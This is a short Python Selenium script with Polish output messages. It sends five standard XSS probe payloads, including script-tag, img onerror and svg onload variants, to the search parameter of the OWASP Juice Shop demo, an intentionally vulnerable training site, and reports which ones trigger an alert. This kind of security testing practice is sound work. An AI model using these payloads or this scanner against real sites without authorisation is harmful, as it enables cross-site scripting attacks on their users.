from selenium import webdriver
from selenium.webdriver.firefox.options import Options
import time

options = Options()
options.headless = False
driver = webdriver.Firefox(options=options)
url = 'https://demo.owasp-juice.shop/#/search?q='

payloads = [
    "<script>alert('XSS')</script>",
    "'\"><img src=x onerror=alert('XSS')>",
    "<img src=x onerror=alert('XSS')>",
    "';alert(String.fromCharCode(88,83,83))//",
    "<svg onload=alert(1)>"
]

for payload in payloads:
    payload = payload.strip()
    driver.get(url + payload)
    time.sleep(2)
    try:
        alert = driver.switch_to.alert
        print(f"wykryto podatność xss dla: {payload}")
        alert.accept()
    except:
        print(f"brak podatności dla: {payload}")

driver.quit()
